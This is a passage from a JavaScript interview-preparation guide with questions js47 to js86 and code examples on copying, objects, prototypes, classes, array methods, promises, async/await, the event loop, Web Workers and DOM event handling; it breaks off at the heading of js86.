// Arrays: by position
const [first, , third = 0, ...rest] = [10, 20, 30, 40, 50];
// first=10, third=30, rest=[40, 50]

// swap without a temp variable
let a = 1, b = 2;
[a, b] = [b, a];

// Objects: by name, with rename, default and nesting
const user = { id: 1, name: "A", address: { city: "Pune" } };
const { name: userName, role = "user", address: { city } } = user;
// userName="A", role="user", city="Pune"

// in function parameters (very common in React props)
function Card({ title, onClick = () => {} }) {}

// remove a key without mutating
const { id, ...withoutId } = user;
```

Destructuring `null`/`undefined` throws. Guard with defaults: `function f({ a } = {}) {}`.

### js48 | What is the difference between a shallow copy and a deep copy?

First, **assignment is not a copy**: `const b = a` makes both names point at the same object.

- **Shallow copy**: a new top-level object, but nested objects are still **shared**.
- **Deep copy**: everything is copied recursively, so nothing is shared.

```js
const original = { name: "A", address: { city: "Pune" } };

// shallow copies
const s1 = { ...original };
const s2 = Object.assign({}, original);
s1.name = "B";              // original.name stays "A"
s1.address.city = "Delhi";  // original.address.city is now "Delhi"! (shared)

// deep copy
const d = structuredClone(original);
d.address.city = "Mumbai";  // original is unaffected
```

Deep copy options:
- **`structuredClone(obj)`**: built in; handles Dates, Maps, Sets and circular references. It can't copy functions or DOM nodes.
- `JSON.parse(JSON.stringify(obj))`: loses `undefined`, functions and Symbols, turns Dates into strings, and throws on circular references.
- A recursive function, or lodash's `cloneDeep`.

Array shallow copies: `[...arr]`, `arr.slice()`, `Array.from(arr)`.

### js49 | What is the difference between Object.freeze, Object.seal and Object.preventExtensions?

| | Add properties | Delete properties | Change values |
|---|---|---|---|
| `Object.preventExtensions` | no | yes | yes |
| `Object.seal` | no | no | **yes** |
| `Object.freeze` | no | no | no |

```js
const o = Object.seal({ a: 1 });
o.a = 2;      // works
o.b = 3;      // ignored (TypeError in strict mode)
delete o.a;   // ignored

const f = Object.freeze({ a: 1, nested: { x: 1 } });
f.a = 2;          // ignored
f.nested.x = 2;   // works: freeze is SHALLOW
Object.isFrozen(f); // true
```

These are used to protect config objects and constants. All three are shallow. Immutability in React and Redux is usually by convention (copy instead of mutate), not by freezing.

### js50 | What are getters, setters and property descriptors?

**Getters/setters** run code when a property is read or written:

```js
const user = {
  first: "Shubam", last: "C",
  get full() { return `${this.first} ${this.last}`; },
  set full(v) { [this.first, this.last] = v.split(" "); },
};
user.full;          // "Shubam C"  (looks like a property, runs a function)
user.full = "A B";  // calls the setter
```

Every property has a **descriptor** with flags:
- `value`
- `writable`: can it be changed?
- `enumerable`: does it show in `for...in` / `Object.keys`?
- `configurable`: can it be deleted, or its flags changed?

```js
Object.defineProperty(user, "id", { value: 7, writable: false, enumerable: false });
user.id = 9;             // ignored
Object.keys(user);       // "id" not listed
Object.getOwnPropertyDescriptor(user, "id");
// { value: 7, writable: false, enumerable: false, configurable: false }
```

Uses: computed or validated properties, read-only fields, hiding internal properties. Vue 2's reactivity was built on `defineProperty` getters/setters; Vue 3 uses Proxy.

### js51 | When should you use a Map instead of an object?

| | Object | Map |
|---|---|---|
| Key types | strings and Symbols only | **any** value (objects, functions, numbers) |
| Order | mostly insertion order (integer-like keys come first) | strict insertion order |
| Size | `Object.keys(o).length` | `map.size` |
| Iteration | via `Object.entries` | directly iterable |
| Default keys | inherits from `Object.prototype` (risk of key clashes / prototype pollution) | none |
| Frequent add/delete | slower | optimised for it |
| JSON | native | needs conversion |

```js
const visits = new Map();
const userObj = { id: 1 };
visits.set(userObj, 5);       // an object as a key
visits.get(userObj);          // 5
for (const [k, v] of visits) {}

const tags = new Set(["a", "b", "a"]); // unique values: Set {"a", "b"}
[...new Set(arr)];                     // dedupe an array
```

Use an **object** for fixed-shape records and JSON data. Use a **Map** for dictionaries with dynamic keys, non-string keys, or frequent changes. Use a **Set** for uniqueness checks (O(1) `has`).

### js52 | What are WeakMap and WeakSet?

They're like Map/Set, but their keys (WeakMap) or values (WeakSet) **must be objects** and are held **weakly**: if nothing else references the object, it can be garbage collected, and the entry disappears.

Because entries can vanish at any time, they're **not iterable** and have no `size` or `clear`.

```js
const cache = new WeakMap();
function getMeta(obj) {
  if (!cache.has(obj)) cache.set(obj, expensiveCompute(obj));
  return cache.get(obj);
}
// once obj is unreachable elsewhere, its cache entry is freed automatically

const visited = new WeakSet();
function process(node) {
  if (visited.has(node)) return;   // e.g. avoid cycles in graph traversal
  visited.add(node);
}
```

Uses: caching or extra data attached to objects you don't own (e.g. DOM nodes), private data per instance, marking objects, all **without leaking memory**. A normal Map would keep those objects alive forever.

### js53 | What are Symbols used for?

A **Symbol** is a primitive that is **guaranteed unique**, even with the same description.

```js
const id1 = Symbol("id");
const id2 = Symbol("id");
id1 === id2; // false

const user = { name: "A", [id1]: 123 };
Object.keys(user);       // ["name"]  (symbol keys are hidden from normal iteration)
JSON.stringify(user);    // '{"name":"A"}'
```

Uses:
1. **Collision-free property keys**: libraries can attach data to objects without clashing with your keys.
2. **Well-known symbols** that customise built-in behaviour:
   - `Symbol.iterator`: makes an object work with `for...of` and spread
   - `Symbol.asyncIterator`, `Symbol.toPrimitive`, `Symbol.hasInstance`
3. Enum-like constants: `const Status = { ACTIVE: Symbol("active") }`.

`Symbol.for("key")` creates a **global, shared** symbol: `Symbol.for("a") === Symbol.for("a")` is true.

### js54 | What do JSON.stringify and JSON.parse do, and what are their pitfalls?

JSON is a text format for data. `JSON.stringify` turns a value into a JSON string; `JSON.parse` turns it back.

```js
const s = JSON.stringify({ a: 1, b: [true, null] }); // '{"a":1,"b":[true,null]}'
JSON.parse(s).b[0];  // true

JSON.stringify(obj, null, 2);                       // pretty print
JSON.stringify(user, ["id", "name"]);               // keep only these keys
JSON.parse(text, (k, v) => (k === "date" ? new Date(v) : v)); // reviver
```

Pitfalls:
- `undefined`, functions and Symbols are **dropped** from objects (and become `null` in arrays).
- `Date` becomes an ISO **string**, and doesn't come back as a Date.
- `NaN`/`Infinity` become `null`; `Map`/`Set` become `{}`.
- **Circular references throw** `TypeError`.
- `BigInt` throws.
- `JSON.parse` on invalid input throws, so wrap untrusted input in `try/catch`.
- An object can control its output with a `toJSON()` method (Date has one).

## Prototypes and classes

### js55 | How does prototypal inheritance work?

Every object has a hidden link, `[[Prototype]]`, to another object (or `null`). When you read a property that the object doesn't have, the engine looks it up **along this chain**: object → its prototype → that prototype's prototype → … → `Object.prototype` → `null`. This is the **prototype chain**.

```js
const animal = { eats: true, walk() { return `${this.name} walks`; } };
const dog = Object.create(animal);   // dog.[[Prototype]] = animal
dog.name = "Rex";

dog.eats;      // true  (found on animal)
dog.walk();    // "Rex walks"  (this = dog, the object before the dot)
dog.hasOwnProperty("eats"); // false

[].map === Array.prototype.map; // true: arrays share their methods via the prototype
```

Key points:
- **Reads** go up the chain. **Writes** always create or modify an **own** property (shadowing).
- Methods live **once** on the prototype and are shared by every instance, which saves memory.
- ES6 `class` and `extends` are built on exactly this mechanism.

Contrast with classical (Java) inheritance: classes are blueprints and instances are copies; in JS, objects inherit **live** from other objects.

### js56 | What is the difference between __proto__ and prototype?

- **`obj.__proto__`** (better: `Object.getPrototypeOf(obj)`) is the actual prototype link that **every object** has.
- **`Fn.prototype`** is a property that only **functions** (constructors and classes) have. It's the object that becomes the `__proto__` of instances created with `new Fn()`.

```js
function Person(name) { this.name = name; }
Person.prototype.greet = function () { return "hi " + this.name; };

const p = new Person("A");
Object.getPrototypeOf(p) === Person.prototype;  // true
p.__proto__ === Person.prototype;                // true
Person.prototype.constructor === Person;         // true
Object.getPrototypeOf(Person.prototype) === Object.prototype; // true
```

Use `Object.getPrototypeOf` / `Object.setPrototypeOf` / `Object.create` instead of `__proto__` (a legacy accessor). Changing prototypes at runtime is slow, so set them up at creation time.

### js57 | What does the `new` keyword do?

`new Fn(args)` performs four steps:

1. Creates a new empty object.
2. Sets that object's prototype to `Fn.prototype`.
3. Calls `Fn` with `this` bound to the new object.
4. Returns the new object, **unless** `Fn` explicitly returns another object.

```js
function myNew(Fn, ...args) {
  const obj = Object.create(Fn.prototype);      // steps 1 and 2
  const result = Fn.apply(obj, args);           // step 3
  return result !== null && typeof result === "object" ? result : obj; // step 4
}

function Car(make) { this.make = make; }
const c = myNew(Car, "Tata");  // same as new Car("Tata")
c instanceof Car;              // true
```

Forgetting `new` with a constructor function makes `this` undefined (strict) or global (sloppy). Classes throw if called without `new`. Arrow functions can't be used with `new`.

### js58 | How do ES6 classes compare with constructor functions?

Classes are mostly **cleaner syntax over prototypes**, with a few real differences.

```js
// ES5
function Animal(name) { this.name = name; }
Animal.prototype.speak = function () { return `${this.name} speaks`; };

// ES6
class Animal2 {
  constructor(name) { this.name = name; }
  speak() { return `${this.name} speaks`; }   // goes on Animal2.prototype
}
typeof Animal2; // "function"
```

Differences:
- A class **must** be called with `new` (otherwise TypeError).
- Class bodies are always in **strict mode**.
- Classes are hoisted but in the **TDZ**, so they can't be used before their declaration.
- Methods are **non-enumerable**.
- `extends` and `super` make inheritance far simpler (including extending built-ins like `Error` and `Array`).
- Classes support `static`, private `#fields`, and class fields.

### js59 | How does inheritance work with extends and super?

```js
class Animal {
  constructor(name) { this.name = name; }
  speak() { return `${this.name} makes a sound`; }
}

class Dog extends Animal {
  constructor(name, breed) {
    super(name);             // MUST call before using `this`
    this.breed = breed;
  }
  speak() {
    return `${super.speak()}, then barks`;  // call the parent method
  }
}

const d = new Dog("Rex", "Lab");
d.speak();                 // "Rex makes a sound, then barks"
d instanceof Animal;       // true
Object.getPrototypeOf(Dog.prototype) === Animal.prototype; // true
```

- `extends` links the prototypes: `Dog.prototype → Animal.prototype`, and static methods: `Dog → Animal`.
- In a subclass constructor, `this` doesn't exist until `super()` runs. Accessing it first throws a ReferenceError.
- If you leave out the constructor, a default `constructor(...args) { super(...args); }` is used.

Prefer composition over deep inheritance chains. One level is usually plenty.

### js60 | What are static members and private fields in classes?

```js
class User {
  static count = 0;              // static field: belongs to the class itself
  #password;                     // private field: unreachable outside the class body

  constructor(name, password) {
    this.name = name;            // public field
    this.#password = password;
    User.count++;
  }

  static create(name) {          // static method: a factory or helper, no instance needed
    return new User(name, "temp");
  }

  check(pw) { return this.#password === pw; }
  #hash() { /* private method */ }
}

const u = User.create("A");
User.count;        // 1
u.check("temp");   // true
u.#password;       // SyntaxError
u.count;           // undefined, static isn't on instances
```

- **Static**: utilities, factories, counters, constants shared by the class (`Math.max` and `Date.now` are statics).
- **`#private`**: real privacy enforced by the language, unlike the `_underscore` convention. Check whether an object has one with `#password in obj`.

### js61 | What is the difference between Object.create and Object.assign?

- **`Object.create(proto, descriptors?)`** makes a **new object whose prototype is `proto`**. Nothing is copied; properties are **inherited** through the chain.
- **`Object.assign(target, ...sources)`** **copies** own enumerable properties from the sources into `target` (shallowly) and returns `target`.

```js
const base = { greet() { return "hi"; } };

const a = Object.create(base);
a.greet();                    // "hi" (inherited)
Object.hasOwn(a, "greet");    // false

const b = Object.assign({}, base, { x: 1 });
Object.hasOwn(b, "greet");    // true (copied)
```

Use `create` for prototype-based inheritance; use `assign` (or spread) for merging and shallow-copying data. `Object.create(null)` makes a dictionary with no inherited keys at all.

## Arrays

### js62 | What is the difference between map, forEach, filter and reduce?

| Method | Returns | Use for |
|---|---|---|
| `forEach` | `undefined` | side effects (logging, pushing elsewhere) |
| `map` | a **new array**, same length | transforming every item |
| `filter` | a **new array**, a subset | keeping the items that pass a test |
| `reduce` | **one value** (any type) | summing, grouping, building objects |
| `find` / `findIndex` | the first match / its index | lookup |
| `some` / `every` | boolean | "any?" / "all?" checks (they short-circuit) |

```js
const orders = [{ amt: 100, paid: true }, { amt: 50, paid: false }];

orders.map((o) => o.amt);                       // [100, 50]
orders.filter((o) => o.paid);                   // [{ amt: 100, ... }]
orders.reduce((sum, o) => sum + o.amt, 0);      // 150
orders.some((o) => !o.paid);                    // true

// group by with reduce
const byStatus = orders.reduce((acc, o) => {
  const k = o.paid ? "paid" : "due";
  (acc[k] ||= []).push(o);
  return acc;
}, {});
```

None of these mutate the array. You **can't `break` out of `forEach`**; use `for...of`, `some` or `find` when you need to stop early. Always pass an initial value to `reduce`; without one, an empty array throws.

### js63 | Implement polyfills for map, filter and reduce.

```js
Array.prototype.myMap = function (cb, thisArg) {
  const out = [];
  for (let i = 0; i < this.length; i++) {
    if (i in this) out[i] = cb.call(thisArg, this[i], i, this); // skip holes
  }
  return out;
};

Array.prototype.myFilter = function (cb, thisArg) {
  const out = [];
  for (let i = 0; i < this.length; i++) {
    if (i in this && cb.call(thisArg, this[i], i, this)) out.push(this[i]);
  }
  return out;
};

Array.prototype.myReduce = function (cb, initial) {
  let i = 0;
  let acc = initial;
  if (arguments.length < 2) {              // no initial value: use the first element
    if (this.length === 0) throw new TypeError("Reduce of empty array with no initial value");
    acc = this[0];
    i = 1;
  }
  for (; i < this.length; i++) {
    if (i in this) acc = cb(acc, this[i], i, this);
  }
  return acc;
};

[1, 2, 3].myMap((x) => x * 2);            // [2, 4, 6]
[1, 2, 3].myReduce((a, b) => a + b);      // 6
```

What interviewers check: the callback receives `(item, index, array)`, `this` comes from the method call (so use a regular `function`, not an arrow), and reduce handles a missing initial value.

### js64 | What is the difference between slice and splice, and which array methods mutate?

- **`slice(start, end)`**: returns a **copy** of a portion. The original is **untouched**. `end` is exclusive.
- **`splice(start, deleteCount, ...items)`**: **changes the original**: removes and/or inserts items in place, and returns the removed items.

```js
const a = [1, 2, 3, 4, 5];
a.slice(1, 3);        // [2, 3]          a unchanged
a.slice(-2);          // [4, 5]

const b = [1, 2, 3, 4, 5];
b.splice(1, 2);       // returns [2, 3]; b is now [1, 4, 5]
b.splice(1, 0, 9);    // inserts 9; b is now [1, 9, 4, 5]
```

**Mutating** methods: `push`, `pop`, `shift`, `unshift`, `splice`, `sort`, `reverse`, `fill`, `copyWithin`.
**Non-mutating**: `map`, `filter`, `reduce`, `slice`, `concat`, `flat`, plus ES2023's `toSorted`, `toReversed`, `toSpliced` and `with(index, value)`.

This matters in React: never call `sort()` or `push()` directly on state. Copy first, or use the non-mutating versions.

### js65 | What are the pitfalls of Array.prototype.sort?

1. **The default sort is by string**, even for numbers:
```js
[10, 9, 1, 100].sort();               // [1, 10, 100, 9]
[10, 9, 1, 100].sort((a, b) => a - b); // [1, 9, 10, 100]  ascending
```
2. **It mutates** the array in place (and returns the same array). Use `[...arr].sort()` or `arr.toSorted()`.
3. The comparator must return a **number**: negative means a before b, positive means b before a, 0 means keep the order. Returning a boolean is a bug.
4. It's **stable** (since ES2019): equal elements keep their original order, so you can sort by a second key first, then the main key.

```js
users.sort((a, b) => a.name.localeCompare(b.name)); // strings, locale-aware
users.sort((a, b) => b.age - a.age || a.name.localeCompare(b.name)); // multi-key
```

### js66 | What are common array tricks (dedupe, flatten, checks)?

```js
// remove duplicates
[...new Set([1, 2, 2, 3])];                  // [1, 2, 3]

// remove falsy values
[0, "a", null, "b", undefined].filter(Boolean); // ["a", "b"]

// flatten
[1, [2, [3, [4]]]].flat();                   // [1, 2, [3, [4]]]
[1, [2, [3, [4]]]].flat(Infinity);           // [1, 2, 3, 4]

// is it an array? (typeof says "object")
Array.isArray(x);

// includes vs indexOf
[NaN].includes(NaN);   // true
[NaN].indexOf(NaN);    // -1

// array-like to array (arguments, NodeList, strings)
Array.from(document.querySelectorAll("li"));
Array.from({ length: 3 }, (_, i) => i * 2); // [0, 2, 4]

// last element
arr.at(-1);

// empty an array in place
arr.length = 0;

// min / max
Math.max(...nums);   // for huge arrays, use reduce instead (argument-count limit)
```

## Asynchronous JavaScript

### js67 | How can JavaScript be asynchronous if it is single-threaded?

The **language** runs your code on **one thread with one call stack**, so only one piece of JS runs at a time. The **runtime** around it (the browser, or Node's libuv) has other threads that do the slow work.

```js
console.log("1");
setTimeout(() => console.log("3"), 0);   // the timer is handed to the runtime
fetch("/api").then(() => console.log("4")); // the network is handled by the runtime
console.log("2");
```

Flow:
1. Your code asks the runtime to start an operation (timer, HTTP, file read) and **doesn't wait**.
2. The JS thread keeps running the remaining code.
3. When the operation completes, the runtime **queues a callback**.
4. The **event loop** pushes queued callbacks onto the stack once it's **empty**.

So it's **concurrent but not parallel** (for your JS code). This is why CPU-heavy JS still blocks everything; use Web Workers (browser) or worker_threads (Node) for real parallelism.

### js68 | What is callback hell, and how do promises solve it?

**Callback hell** is deeply nested callbacks for dependent async steps:

```js
getUser(id, (err, user) => {
  if (err) return handle(err);
  getOrders(user.id, (err, orders) => {
    if (err) return handle(err);
    getInvoice(orders[0].id, (err, invoice) => {
      if (err) return handle(err);
      // ...the "pyramid of doom"
    });
  });
});
```

Problems:
- Hard to read; errors must be handled at **every** level.
- **Inversion of control**: you trust the library to call your callback exactly once, not twice, and not never.
- Hard to run steps in parallel or compose them.

Promises flatten it and centralise errors:

```js
getUser(id)
  .then((user) => getOrders(user.id))
  .then((orders) => getInvoice(orders[0].id))
  .then(show)
  .catch(handle);           // one place for every error

// even cleaner with async/await
const user = await getUser(id);
const orders = await getOrders(user.id);
```

### js69 | What is a Promise, and what are its states?

A **Promise** is an object representing the **future result** of an async operation.

States:
- **pending**: not finished yet
- **fulfilled**: succeeded, with a value
- **rejected**: failed, with a reason (an error)

Once fulfilled or rejected, it's **settled**, and it never changes again. Calling `resolve` or `reject` a second time is ignored.

```js
const p = new Promise((resolve, reject) => {
  // the executor runs IMMEDIATELY (synchronously)
  setTimeout(() => {
    Math.random() > 0.5 ? resolve("ok") : reject(new Error("fail"));
  }, 1000);
});

p.then((v) => console.log(v))
 .catch((e) => console.error(e.message))
 .finally(() => console.log("done either way"));
```

Key facts:
- `.then`/`.catch` callbacks always run **asynchronously**, as **microtasks**, even if the promise is already settled.
- If the executor throws, the promise is rejected.
- `Promise.resolve(v)` / `Promise.reject(e)` create already-settled promises.

### js70 | How does promise chaining work?

`.then()` **always returns a new promise**, which settles with whatever the callback returns:
- a **value** → the next `then` receives it;
- a **promise** → the chain **waits** for it, then passes its result on;
- a **throw** → the chain skips to the next `catch`.

```js
fetch("/user")
  .then((res) => res.json())             // returns a promise, so it's awaited
  .then((user) => user.id)               // returns a value
  .then((id) => fetch(`/orders/${id}`))
  .then((res) => {
    if (!res.ok) throw new Error(res.status); // jump to catch
    return res.json();
  })
  .catch((err) => {
    console.error(err);
    return [];                           // recover: the chain continues fulfilled
  })
  .then((orders) => render(orders))
  .finally(() => hideSpinner());          // runs regardless; passes the value through
```

Common bug: **forgetting to `return`** inside `then`. The next step then runs immediately with `undefined` instead of waiting.

### js71 | What is the difference between Promise.all, allSettled, race and any?

All take an iterable of promises:

| Method | Resolves when | Rejects when |
|---|---|---|
| `Promise.all` | **all** fulfil → array of values (in input order) | **any one** rejects (fail-fast) |
| `Promise.allSettled` | **all** settle → array of `{status, value \| reason}` | never |
| `Promise.race` | the **first to settle** (fulfil or reject) wins | if the first to settle rejects |
| `Promise.any` | the **first to fulfil** | **all** reject → `AggregateError` |

```js
const [user, posts] = await Promise.all([getUser(), getPosts()]); // parallel, needs both

const results = await Promise.allSettled(urls.map((u) => fetch(u)));
const ok = results.filter((r) => r.status === "fulfilled");      // partial success is fine

const data = await Promise.race([
  fetch(url),
  new Promise((_, rej) => setTimeout(() => rej(new Error("timeout")), 5000)),
]);                                                             // a timeout pattern

const fastest = await Promise.any([mirror1(), mirror2()]);      // first success wins
```

### js72 | Does Promise.all cancel the other promises when one fails? How do you cancel a fetch?

**No.** `Promise.all` rejects as soon as one input rejects, but the other operations **keep running**: promises have no built-in cancellation. Their results are simply ignored.

To actually cancel work, use **`AbortController`**:

```js
const controller = new AbortController();

fetch("/api/search?q=re", { signal: controller.signal })
  .then((r) => r.json())
  .catch((err) => {
    if (err.name === "AbortError") return;  // cancelled on purpose
    throw err;
  });

controller.abort();   // cancels the request; the fetch promise rejects with AbortError

// timeout helper
fetch(url, { signal: AbortSignal.timeout(5000) });
```

Typical uses: cancelling stale search requests while the user types, aborting fetches when a React component unmounts, and pairing with `Promise.all` to cancel siblings once one fails (share one controller across them).

### js73 | What is async/await, and how does it work?

`async/await` is syntax built **on top of promises** that makes async code read like synchronous code.

- An `async` function **always returns a promise**. Returning `x` resolves it with `x`; throwing rejects it.
- `await p` **pauses that function** (not the whole thread) until `p` settles, then gives back the value or **throws** the rejection reason.

```js
async function loadDashboard(id) {
  try {
    const user = await getUser(id);          // pause here
    const orders = await getOrders(user.id);
    return { user, orders };                 // resolves the returned promise
  } catch (err) {
    console.error("failed", err);            // catches rejections from either await
    throw err;
  }
}
```

Under the hood, everything after an `await` is scheduled as a **microtask continuation**, much like `.then`. While the function is paused, the event loop runs other work.

`return await` vs `return`: inside a `try`, you need `return await p` for the `catch` to catch `p`'s rejection. Outside a try they behave the same.

Top-level `await` works in ES modules.

### js74 | How do you handle errors in async code?

```js
// 1. try/catch around await
async function load() {
  try {
    const res = await fetch("/api");
    if (!res.ok) throw new Error(`HTTP ${res.status}`); // fetch doesn't reject on 404/500!
    return await res.json();
  } catch (err) {
    log(err);
    return null;
  } finally {
    setLoading(false);
  }
}

// 2. .catch on a promise chain
load().catch(handle);

// 3. a global safety net
window.addEventListener("unhandledrejection", (e) => report(e.reason));
// Node: process.on("unhandledRejection", ...)
```

Common mistakes:
- **Forgetting to `await`** or `return` a promise: its rejection escapes your try/catch and becomes an **unhandled rejection**.
- An empty `catch {}` **swallows** errors silently.
- A `try/catch` around `setTimeout(() => { throw ... })` doesn't work: the callback runs later, on a different stack.
- Throwing strings instead of `Error` objects loses the stack trace.

### js75 | How do you run async operations sequentially vs in parallel?

```js
// SEQUENTIAL: each waits for the previous one (total = sum of times)
for (const id of ids) {
  const user = await getUser(id);    // use when each step depends on the last
  results.push(user);
}

// PARALLEL: start them all, then wait (total ≈ the slowest one)
const users = await Promise.all(ids.map((id) => getUser(id)));

// independent awaits: start both first
const userP = getUser(1);            // started
const postsP = getPosts(1);          // started
const [user, posts] = await Promise.all([userP, postsP]);
```

The **forEach trap**: `forEach` doesn't wait for async callbacks.

```js
ids.forEach(async (id) => { await save(id); });
console.log("done"); // logs BEFORE any save finishes; errors are unhandled
```

Use `for...of` (sequential) or `Promise.all` + `map` (parallel).

**Limited concurrency** (e.g. 5 at a time, to respect rate limits): process in batches, or use a small pool helper or library (`p-limit`).

### js76 | Implement Promise.all.

```js
function promiseAll(iterable) {
  return new Promise((resolve, reject) => {
    const items = Array.from(iterable);
    const results = new Array(items.length);
    let remaining = items.length;

    if (remaining === 0) return resolve([]);  // empty input resolves immediately

    items.forEach((item, i) => {
      Promise.resolve(item)                  // handles plain values too
        .then((value) => {
          results[i] = value;                // keep INPUT order, not finish order
          remaining -= 1;
          if (remaining === 0) resolve(results);
        })
        .catch(reject);                      // first rejection rejects all (later calls are ignored)
    });
  });
}

promiseAll([1, Promise.resolve(2), new Promise((r) => setTimeout(() => r(3), 100))])
  .then(console.log); // [1, 2, 3]
```

What's checked: the result order matches the input, counting completions (not `results.length`), non-promise values, the empty array, and fail-fast rejection.

### js77 | How do you convert a callback-based function into a promise?

Wrap it in `new Promise`, and call `resolve` or `reject` from the callback:

```js
function readFileAsync(path) {
  return new Promise((resolve, reject) => {
    fs.readFile(path, "utf8", (err, data) => {
      if (err) reject(err);
      else resolve(data);
    });
  });
}

// generic promisify for error-first callbacks
const promisify = (fn) => (...args) =>
  new Promise((resolve, reject) =>
    fn(...args, (err, result) => (err ? reject(err) : resolve(result)))
  );

// a promise-based sleep
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
await sleep(500);
```

Node has `util.promisify` built in, and most core modules now have promise versions (`fs/promises`, `timers/promises`).

Avoid the "promise constructor anti-pattern": don't wrap something that already returns a promise in `new Promise`.

### js78 | How does the event loop work?

The event loop decides **what runs next** on the single JS thread.

The pieces:
- **Call stack**: the code running now.
- **Host APIs** (browser Web APIs or Node's libuv): timers, network, I/O, running outside the stack.
- **Task (macrotask) queue**: callbacks from `setTimeout`, `setInterval`, I/O, UI events, `MessageChannel`.
- **Microtask queue**: promise callbacks (`then`/`catch`/`finally`, the code after `await`), `queueMicrotask`, `MutationObserver`.

The loop:
1. Run one task until the call stack is empty (the first task is the script itself).
2. Run **all** microtasks, including any that are added while draining.
3. The browser may **render** (style, layout, paint; `requestAnimationFrame` runs just before).
4. Take the next task and repeat.

```js
console.log("A");
setTimeout(() => console.log("B"), 0);
Promise.resolve().then(() => console.log("C"));
console.log("D");
// A D C B: sync first, then microtasks, then the next task
```

Consequences: long synchronous code freezes the page; an endless chain of microtasks can **starve** rendering and timers; `setTimeout(fn, 0)` means "after the current task and all its microtasks".

### js79 | What is the difference between microtasks and macrotasks? Predict the output.

- **Macrotasks (tasks)**: `setTimeout`, `setInterval`, I/O, UI events, `setImmediate` (Node). **One** runs per loop turn.
- **Microtasks**: promise reactions, `await` continuations, `queueMicrotask`, `MutationObserver`. **All** of them run after each task, before the next task or a render.

```js
console.log("1");

setTimeout(() => console.log("2"), 0);

Promise.resolve()
  .then(() => console.log("3"))
  .then(() => console.log("4"));

queueMicrotask(() => console.log("5"));

(async () => {
  console.log("6");               // sync until the first await
  await null;
  console.log("7");               // microtask
})();

console.log("8");
```

Output: **1 6 8 3 5 7 4 2**

Why:
- Synchronous code first: 1, 6 (an async function runs synchronously until its first `await`), 8.
- Microtasks in the order they were queued: 3, 5, 7. Then 4, because it was only queued when 3's callback finished.
- Then the next task: 2.

### js80 | Why isn't setTimeout(fn, 0) immediate, and why do timers drift?

The delay is a **minimum**, not a guarantee. `setTimeout(fn, 0)` queues `fn` as a task once at least 0ms have passed, so it waits for:
1. the current synchronous code to finish,
2. all microtasks,
3. any tasks already queued (and maybe a render).

```js
setTimeout(() => console.log("timeout"), 0);
const end = Date.now() + 2000;
while (Date.now() < end) {}     // blocks the thread for 2s
// "timeout" logs after ~2000ms, not 0
```

Extra delays:
- Browsers clamp nested timers (5+ levels deep) to at least **4ms**.
- Background tabs throttle timers to about 1s or more.

`setInterval` **drifts**: if a callback takes longer than the interval, or the thread is busy, ticks get delayed or bunched up. For accurate timing, use a recursive `setTimeout` that computes the next delay from `Date.now()`, and `requestAnimationFrame` for animations.

### js81 | What are iterators and generators?

**Iterator protocol**: an object with a `next()` method returning `{ value, done }`.
**Iterable protocol**: an object with a `[Symbol.iterator]()` method that returns an iterator. Iterables work with `for...of`, spread and destructuring. Arrays, strings, Maps and Sets are iterable.

```js
const range = {
  from: 1, to: 3,
  [Symbol.iterator]() {
    let cur = this.from, last = this.to;
    return { next: () => (cur <= last ? { value: cur++, done: false } : { value: undefined, done: true }) };
  },
};
[...range]; // [1, 2, 3]
```

A **generator** (`function*`) is the easy way to build iterators. `yield` pauses the function and resumes it on the next `next()`:

```js
function* idGenerator() {
  let id = 1;
  while (true) yield id++;     // infinite but lazy: computes on demand
}
const ids = idGenerator();
ids.next().value; // 1
ids.next().value; // 2

function* take(n, it) { for (const x of it) { if (n-- <= 0) return; yield x; } }
```

Uses: lazy sequences, custom iteration, paging through APIs. **Async generators** (`async function*` + `for await...of`) stream async data, such as reading a large file or a paginated API chunk by chunk.

### js82 | What are Web Workers?

**Web Workers** run JavaScript on a **separate background thread**, so heavy CPU work doesn't freeze the UI.

```js
// main.js
const worker = new Worker("worker.js");
worker.postMessage({ numbers: bigArray });          // data is COPIED (structured clone)
worker.onmessage = (e) => console.log("sum", e.data);

// worker.js
self.onmessage = (e) => {
  const sum = e.data.numbers.reduce((a, b) => a + b, 0);
  self.postMessage(sum);
};
```

Limits:
- **No DOM access** (no `document` or `window`).
- Communication is only through messages. Large binary data can be **transferred** without copying (`postMessage(buf, [buf])`), or shared with `SharedArrayBuffer`.

Uses: parsing big files, image processing, encryption, heavy calculations.

Related: **Service Workers** are a different kind. They're a network proxy for offline caching and push notifications (PWAs). Node's equivalent of web workers is **`worker_threads`**.

## Browser and DOM basics

### js83 | What is the DOM, and what is the difference between window and document?

The **DOM** (Document Object Model) is the browser's **tree of objects** representing the HTML page. JS reads and changes the page through it.

```js
const list = document.querySelector("#list");
const item = document.createElement("li");
item.textContent = "New";
list.appendChild(item);
```

- **`window`**: the global object of the browser tab. It holds global variables and the browser APIs: `setTimeout`, `fetch`, `localStorage`, `location`, `history`, `innerWidth`, and `document`.
- **`document`**: a property of window. It's the root of the DOM, used for finding and changing elements.

`window.document === document`. The rest of `window` (location, history, navigator, screen) is called the **BOM** (Browser Object Model).

Also know: `querySelector` (first match, any CSS selector) vs `getElementById`; `querySelectorAll` returns a **static** NodeList, while `getElementsByClassName` returns a **live** HTMLCollection.

### js84 | How does event propagation work (capturing, target, bubbling)?

When you click an element, the event travels in **three phases**:

1. **Capturing**: from `window` **down** through the ancestors to the target.
2. **Target**: at the element that was clicked.
3. **Bubbling**: back **up** from the target through its ancestors to `window`.

Listeners run in the **bubbling** phase by default. Pass `{ capture: true }` to run in the capturing phase.

```html
<div id="outer"><button id="btn">Click</button></div>
```
```js
outer.addEventListener("click", () => console.log("outer capture"), { capture: true });
outer.addEventListener("click", () => console.log("outer bubble"));
btn.addEventListener("click", () => console.log("button"));
// Click: outer capture -> button -> outer bubble
```

- `event.target`: the element that started the event.
- `event.currentTarget`: the element whose listener is running now.
- A few events don't bubble (`focus`, `blur`, `mouseenter`); use `focusin`/`focusout` instead.

### js85 | What is event delegation?

Instead of a listener on every child, put **one listener on a common parent** and use `event.target` to work out which child was clicked. It works because events **bubble**.

```js
// <ul id="todos"> with many <li data-id="..."><button class="del">x</button></li>
document.getElementById("todos").addEventListener("click", (e) => {
  const btn = e.target.closest(".del");      // handles clicks on nested elements
  if (!btn) return;
  const id = btn.closest("li").dataset.id;
  deleteTodo(id);
});
```

Benefits:
- **One listener** instead of hundreds, so less memory.
- Works automatically for elements **added later** (dynamic lists).
- Less setup and teardown code.

React uses this idea internally: it attaches one listener per event type at the root container.

### js86 | What is the difference between preventDefault and stopPropagation?

